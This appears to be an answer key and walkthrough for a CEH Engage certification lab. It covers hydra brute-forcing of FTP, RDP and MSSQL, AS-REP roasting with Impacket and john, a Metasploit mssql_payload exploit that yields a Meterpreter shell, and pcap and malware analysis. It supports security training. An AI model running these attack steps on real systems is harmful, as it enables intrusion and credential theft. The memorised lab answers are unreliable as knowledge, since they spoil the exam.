## CEH Engage – Part II  
System Hacking  
Malware Threats  
Sniffing  
Social Engineering  
Denial-of-Service

---

**Q1. You are assigned to perform a brute-force attack on a Linux machine from the 192.168.10.0/24 subnet and crack the FTP credentials of user nick. An exploitation information file is saved in the home directory of the FTP server. Determine the vendor homepage of the FTP vulnerability specified in the file. (Format: aaaaa://aaa.aaaaaaaa.aaa/)**

**Answer:** https://www.crushftp[.]com/

**Explanation:**  

Determine hosts with open FTP service:
`nmap -p 21 -A --open <target subnet>`

Identify Linux host via Nmap or TTL ≤ 64.

Perform brute-force attack:
`hydra -l nick -P password.txt ftp://192.168.10.111`

Log in to FTP:
`ftp <target IP>`

Download the exploitation file:
`get 52012.py`

If required to search directories:
`sudo apt install lftp -y`  
`lftp ftp://username@IP`  
`find . -name "filename"`  
`get <filepath>`

---

**Q2. An intruder performed network sniffing on a machine from the 192.168.10.0/24 subnet and obtained login credentials for the moviescope.com website using remote packet capture. Analyze the Mscredremote.pcapng file and determine the credentials obtained. (Format: aaaa/aaaaa)**

**Answer:** kety/apple

**Explanation:**  

Apply Wireshark display filter:
`http.request.method == POST`

Analyze captured HTTP POST requests to identify credentials.

<img width="758" height="235" alt="image" src="https://github.com/user-attachments/assets/ff836e19-0162-447b-8adf-e1ea95e8e716" />

---

**Q3. Analyze the packet capture file ServerDoS.pcapng and determine the UDP-based application layer protocol used by the attacker to flood the network. (Format: Aaaaa Aaaaaaa Aaaaaaaa)**

**Answer:** Quake Network Protocol

**Explanation:**  

Inspect destination UDP port in the pcap file.  
Port 26000 = Quake Network Protocol.

---

**Q4. A severe DDoS attack occurred against an Ubuntu server in the SKILL.CEH network. Analyze the DD_attack.pcapng file and determine the IP address of the attacker using UDP. (Format: NNN.NNN.NN.NNN)**

**Answer:** 192.168.10.144

**Explanation:**  

In Wireshark - filter on:
`udp`

Identify the source IP generating excessive UDP traffic.

---

**Q5. Analyze the PyD_attack.pcapng file and determine the attacker IP targeting the RPC service of the target machine. (Format: NNN.NNN.NN.NN)**

**Answer:** 172.30.10.99

**Explanation:**  

3 hosts with open RPC service (port 135) on subnet
In Wireshark, navigate to:
Statistics → Conversations → TCP tab

Or apply filter:
`tcp.port == 135`

---

**Q6. Analyze Anti-DDoS Guardian reports stored on EH Workstation-1 and determine the attacker IP that transmitted the highest number of packets to the target machine. (Format: NNN.NNN.NN.NNN)**

**Answer:**

**Explanation:**  

Review Anti-DDoS Guardian reports and identify the source IP with the highest packet count.

---

**Q7. Perform an AS-REP roasting attack against the domain controller and determine the password of the vulnerable user account. (Format: aNaaN*NNN)**

**Answer:** c3ll0@123

**Explanation:**  

Use Impacket GetNPUsers:
`python3 GetNPUsers.py SKILL.CEH/ -no-pass -usersfile users.txt -dc-ip <DC IP>`

Copy the hash into a file:
`echo '[hash]' > joshuahash.txt`

Crack the hash:
`john --wordlist=rockyou.txt joshuahash.txt`

---

**Q8. Exploit a misconfigured SQL Server vulnerability, retrieve the MSS.txt file from the Public Downloads folder, and determine its size in bytes. (Format: N)**

**Answer:** 7

**Explanation:**  

Scan for MSSQL service:
`nmap -p 1433 -A -v 192.168.10.0/24`

Brute-force credentials:
`hydra -L users.txt -P rockyou.txt <target IP> mssql`

Note credentials:
'Server_mssrv/Spidy'

Attempt login using mssqlclient.py:
`python3 /path/to/mssqlclient.py SKILL.CEH/Server_mssrv:Spidy@192.168.10.144 -port 1433`

Note database name

Launch metasploit to obtain shell:
1. `msfconsole`
2. `use exploit/windows/mssql/mssql_payload`
3. `set RHOST <target IP>`
4. `set USERNAME <username obtained>`
5. `set PASSWORD <password obtained>` 
6. `set DATABASE <database name obtained>`
7. `exploit`

Meterpreter session opens:
`shell > enter`
`cd \Users\Public\Downloads`
`dir`

Check file size.

---

**Q9. Crack RDP credentials of user Maurice from the 192.168.10.0/24 subnet and determine the password. (Format: Aaaaaaa@NNNN)**

**Answer:** Pumpkin@1234

**Explanation:**  

Scan for RDP service (port 3389).  
Perform brute-force attack:
`hydra -l Maurice -P password.txt <target IP> rdp`

---

**Q10. Perform malware scanning on the file Tools.rar and determine the last four digits of its SHA-256 hash. (Format: aNNN)**

**Answer:** d282

**Explanation:**  

Navigate to filepath and compute hash:
`sha256sum Tools.rar`

---

**Q11. Analyze the Logfile.PML file and determine the Parent PID of the malicious process H3ll0.exe. (Format: NNNN)**

**Answer:** 6952

**Explanation:**  

Transfer file from Linux to Windows machine:
`Places>Network>smb:\\<windows IP>`
Open Procmon and filter for H3ll0.exe.  
Review process details to identify the Parent PID.

---

**Q12. Analyze the ELF executable Tornado.elf and determine the entropy value up to two decimal places. (Format: N*NN)**

**Answer:** 2.87

**Explanation:**  

Transfer file to Windows machine.  
Open DIE.exe and upload the file.  
View entropy value from analysis output.

---

**Q13. Scan the target subnets to identify the machine with remote packet capture (rpcap) service enabled and determine its IP address. (Format: NNN.NNN.NN.NNN)**

**Answer:** 192.168.10.144

**Explanation:**  

Scan for rpcap service (default port 2002):
`nmap -p 2002 192.168.10.0/24`

---

**Q14. Extract hidden data from the image file stealth.jpeg using steghide and determine the tender quotation value. (Format: NNNNNNN)**

**Answer:** 3965222

**Explanation:**  

Extract hidden data using steghide tool (can add -v for verbose output): 
`steghide --extract -sf stealth.jpeg`

Enter passphrase: `azerty@123`  
Review extracted text file for the quotation value.

---

**Q15. Perform a vulnerability search using searchsploit and determine the path of the AirDrop 2.0 vulnerability. (Format: aaaaaaa/aaa/NNNNN.a)**

**Answer:** 

**Explanation:**  

Search for the vulnerability:
`searchsploit -t AirDrop 2.0`

Identify the corresponding exploit path from the results.
